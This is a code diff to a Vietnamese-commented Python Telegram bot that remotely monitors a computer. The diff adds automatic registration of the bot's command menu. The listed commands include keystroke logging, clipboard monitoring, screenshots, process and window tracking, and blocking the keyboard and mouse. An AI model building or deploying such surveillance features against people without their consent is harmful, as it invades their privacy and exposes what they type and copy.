@@ -785,8 +785,65 @@ HELP_TEXT = (
     "<b>Khác</b>\n"
     "/config - Xem cấu hình\n"
     "/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi cấu hình\n"
-    "/logs [n] - Xem log gần đây"
+    "/logs [n] - Xem log gần đây\n"
+    "/reload - Cập nhật lại menu lệnh"
 )
+
+
+# Danh sách lệnh hiển thị trong menu của bot trên Telegram.
+# Script sẽ TỰ ĐỘNG đẩy danh sách này lên Telegram khi khởi động (setMyCommands).
+BOT_COMMANDS = [
+    ("start",    "Bắt đầu / xem trợ giúp"),
+    ("help",     "Danh sách lệnh"),
+    ("status",   "Trạng thái hiện tại"),
+    ("shot",     "Chụp màn hình ngay"),
+    ("interval", "Đổi chu kỳ chụp (giây)"),
+    ("screen",   "Bật/tắt chụp định kỳ"),
+    ("activity", "Bật/tắt báo đổi cửa sổ"),
+    ("process",  "Bật/tắt báo tiến trình mới"),
+    ("clip",     "Bật/tắt theo dõi clipboard"),
+    ("keylog",   "Bật/tắt ghi phím gõ"),
+    ("block",    "Ngắt bàn phím & chuột"),
+    ("unblock",  "Kết nối lại bàn phím & chuột"),
+    ("lock",     "Khóa màn hình"),
+    ("shutdown", "Tắt máy (cần OTP)"),
+    ("restart",  "Khởi động lại (cần OTP)"),
+    ("stop",     "Dừng giám sát (cần OTP)"),
+    ("confirm",  "Xác nhận mã OTP"),
+    ("cancel",   "Hủy yêu cầu đang chờ"),
+    ("config",   "Xem cấu hình"),
+    ("set",      "Đổi cấu hình: /set khóa giá_trị"),
+    ("logs",     "Xem log gần đây"),
+    ("reload",   "Cập nhật lại menu lệnh"),
+]
+
+
+def register_bot_commands(retries=3):
+    """TỰ ĐỘNG đẩy menu lệnh lên Telegram (setMyCommands) + đặt nút menu.
+
+    Chạy trong luồng riêng nên KHÔNG chặn vòng lặp nhận lệnh hay luồng gửi,
+    đảm bảo không làm gián đoạn sử dụng ở cả hai phía.
+    """
+    payload = json.dumps(
+        [{"command": c, "description": d} for c, d in BOT_COMMANDS],
+        ensure_ascii=False)
+    for attempt in range(retries):
+        if not RUNNING:
+            return False
+        res = tg_call("setMyCommands", {"commands": payload}, timeout=30)
+        if res.get("ok"):
+            # đặt nút menu hiển thị danh sách lệnh (không bắt buộc, lỗi thì bỏ qua)
+            try:
+                tg_call("setChatMenuButton",
+                        {"menu_button": json.dumps({"type": "commands"})}, timeout=20)
+            except Exception:
+                pass
+            log("Bot commands registered (%d lenh)." % len(BOT_COMMANDS))
+            return True
+        log("setMyCommands fail (lan %d/%d): %s" % (
+            attempt + 1, retries, res.get("description", res.get("error", ""))))
+        time.sleep(3)
+    return False
 
 
 def parse_bool(v):
@@ -803,6 +860,11 @@ def handle_command(text, chat_id):
 
     if cmd in ("/start", "/help"):
         notify(HELP_TEXT)
+        return
+
+    if cmd == "/reload":
+        notify("🔄 Đang cập nhật lại menu lệnh...")
+        threading.Thread(target=register_bot_commands, daemon=True).start()
         return
 
     if cmd == "/status":
@@ -1087,6 +1149,9 @@ def main():
 
     # luong gui
     threading.Thread(target=sender_loop, daemon=True).start()
+
+    # tu dong cap nhat menu lenh len Telegram (chay nen, khong chan gi)
+    threading.Thread(target=register_bot_commands, daemon=True).start()
 
     # cac luong giam sat
     threading.Thread(target=screenshot_loop, daemon=True).start()
